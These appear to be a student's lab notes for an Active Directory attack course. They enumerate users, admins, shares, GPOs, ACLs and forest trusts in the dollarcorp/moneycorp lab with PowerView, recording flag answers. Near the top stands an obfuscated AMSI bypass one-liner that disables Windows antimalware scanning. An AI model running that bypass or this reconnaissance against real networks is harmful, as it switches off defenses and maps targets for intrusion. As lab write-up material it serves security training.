Enumeration


# PowerShell 1337 Color Mode:

```
$host.UI.RawUI.ForegroundColor = "DarkGreen"
$host.UI.RawUI.BackgroundColor = "Black"
```

# Bypass AMSI:

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

# **Learning Objective 1:**
- Enumeratate following for the dollarcorp domain:
    - Users
    - Computers
    - Domain Administrators
    - Enterprise Administrators
    - Shares

* * *


# Enumerate Users:

```
powershell -ep bypass
. .\PowerView.ps1
Get-NetUser
```

- List specicific property of all the users e.g. samaccountname:

```
Get-NetUser | select -ExpandProperty samaccountname
```

![c895b4c7f4475ff15ceb1feb606a86f9.png](../../_resources/95ccbd0922aa4ca88f7cdd37cb10b5b0.png)

# Enumerate Computers:

```
Get-NetComputer
```

![c451cf9b53907a4907be67e0e070606a.png](../../_resources/7ebed3daadae40aa85feead54996fc57.png)

- Get IPs of Computers in subnet using ADModule

```
 Get-ADcomputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

![aff43b3644461ff81f62d8ae949e81e4.png](../../_resources/2683f60a49864eef8ae406a6b4a9f63f.png)

# Enumerate Domain Admins
- See Attributes of the Domain Admins Group:

```
Get-NetGroup -GroupName "Domain Admins" -FullData
```

![0de7d06a7bc303e0de3154721f98d9b1.png](../../_resources/1f7ab023874d48ddb706d646b27b1c24.png)

- Get Members of the Domain Admins group:

```
Get-NetGroupMember -GroupName "Domain Admins"
```

![7bfdd714ae1e912cb1f12f0743f4a304.png](../../_resources/d92fbfecd42f495e837f7ea1e61397b5.png)

# Enumerate Enterprise Admins
- Get Members of the Enterprise Admins Group:

```
# Have to query the the root domain because Enterprise Admins group is only present in the root of a forest

Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local
```

![25352af77252e8f3a84cd1334f27d65d.png](../../_resources/3e53e949f3b94cf8a6f4aef7089748d9.png)

* * *

# **Flag 1:**

- SID of the member of the Enterprise Admins group

![127e1fec035109844a6691a7d05adf70.png](../../_resources/3ab159dfdb3e4cb2a1854dbdc0b05c39.png)
---

# Find interesting shares
```
Invoke-ShareFinder -Exclude Standard -ExcludePrint -ExcludeIPC -Verbose
```
![7fe7ffdc5ed9519f62ee7c29eafc2e61.png](../../_resources/f0aed46b7a6a438c9a51e40e310adc20.png)

---
# **Learning Objective 2:** 
- Enumerate following of dollarcorp domain:
	- List all the OUs
	- List all the computers in the StudentMachines OU.
	- List the GPOs
	- Enumerate GPO applied on the StudentMachines OU
***
- Enumerate Restricted Groups from GPO:
```
Get-NetGPOGroup -Verbose
```
- Look for membership of the group "RDPUsers"
```
Get-NetGroupMember -GroupName RDPUsers

#PowerView Dev
Get-NetGroupMember RDPusers
```
![a78ee6cf544efc91a5980f3c4fc6e221.png](../../_resources/2c16235003bb44369ab6b7d953a53000.png)

# List all the OUs
```
Get-NetOU
```
![2ce29e33016f137f1ee0a7be8a016716.png](../../_resources/fca09c313ce34045aeb531c5a0a300ce.png)

# List all Computers in StudentMachines OU:
```
# PowerView
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```
![ec819538b9704f71803a520d9d0fcd30.png](../../_resources/cfa30bb61c8b4f3db25c8d8b2fee4b78.png)

# List the GPOs:
```
Get-NetGPO
```
![6c9c07011d65aba9704439497dd54114.png](../../_resources/b66ce75327534324ad815c25c59237b5.png)

# Enumerate GPO applied to StudentMachines OU:
```
# PowerView
(Get-NetOU StudentMachines -FullData).gplink
# PowerView Dev
(Get-NetOU StudentMachines).gplink
```
![a6313cc465384179c84195798fe80565.png](../../_resources/5a0db634c45c424f8ad8a7677cbf5065.png)
```
Get-NetGPO -ADSPath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
```

![06adcdbb1b1dde1b1b4a8461fc73efa3.png](../../_resources/d8345323ff3e4f88a0d595603081f4ad.png)

---
# **FLAG 2**:

- Display name of the GPO applied on StudentMachines OU

![2e52f21585c191a837a768756acf1767.png](../../_resources/c6c2babc6a8a451fa3ea2d663efa55f3.png)

---
# **Learning Objective 3:** 
- Enumerate the following:
	- ACL for the Users group
	- ACL for the Domain admins group
	- All modify/rights/permissions for the student537
---
# ACL for the Users group:
```
Get-ObjectAcl -SamAccountName "Users" -ResolveGUIDs -Verbose
```
# ACL for the Domain Admins group:
```
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
```
- nothing out of the ordinary in lab here.
# ACLs for all of the GPOs:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```
# GPOs where student537 or RDPUsers group have interesting permissions:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "student"}
```
- nothing interesting in lab here.
# Check All Modify rights/perms for the student537 or RDPUsers group:
- use the old PowerView for this to work.
```
Invoke-ACLScanner -ResolveGUIDs |?{$_.IdentityReference -match "student"}
```
```
Invoke-ACLScanner -ResolveGUIs | ?{$_.IdentityReference -match "RDPUsers"}
```
# **FLAG 3:**
- ActiveDirectory Rights for RDPUsers group on the users named Control537User

![f97bf4b346607b8a9c4a0bd21e6e1e83.png](../../_resources/ae1f4035e8014392954a1d6a7f2f2b84.png)

***
# Learning Objective 4:
- Enumerate all domains in the moneycorp.local forest
- Map the trusts of the dollarcorp.moneycorp.local domain
- Map External trusts in moneycorp.local forest
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
***
# Enumerate all domains:
```
Get-NetForestDomain -Verbose
```
![3c8d2bd10db07da0b37073eb1582a969.png](../../_resources/2b387f45d9b345b6b26c288ef28e3b20.png)

# Map the trusts of the dollarcorp domain:
```
Get-NetDomainTrust -NET
```
![1b45bfaa586fb83454937fc90bcb2f7f.png](../../_resources/5362bfb5a22d480e9e1c0a0d464bb97c.png)
![a2268137be1fcbac0e2875e40067c392.png](../../_resources/74154425b27f4dfb9a4a42dcad1454da.png)

# Map all the trusts of the moneycorp.local forest:
```
Get-NetForestDomain | Get-NetDomainTrust -NET
```
![33c9906396943a07ceee7e0b70abc440.png](../../_resources/c3a210451d324683abc829eec33a6f53.png)

# Get only the external trusts:
```
Get-NetForestDomain | Get-NetDomainTrust -NET | ?{$_.TrustType -eq 'External'}
```
![2b72d26e2ebc747315c74d669753f350.png](../../_resources/4193c570b4b24e719b5ab62203f9b49a.png)

# Identify external trusts of the dollarcorp.local domain
```
Get-NetDomainTrust -NET | ?{$_.TrustType -eq 'External'}
```
![fc8aebe7d7085b4d2bd3262c3cd79410.png](../../_resources/ac2d74c6e18c47c4ab326d897cea1254.png)

# Extract info from the external forest:
- Its Bi-directional so we can enumerate the external trust
```
Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust -NET
```
![e57a1bfde5c7e103e3dde806745042f7.png](../../_resources/2ab2e7bfb373484884009d444a59be0f.png)

***
# **FLAG 4:**
- Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
- `BiDirectional`
***
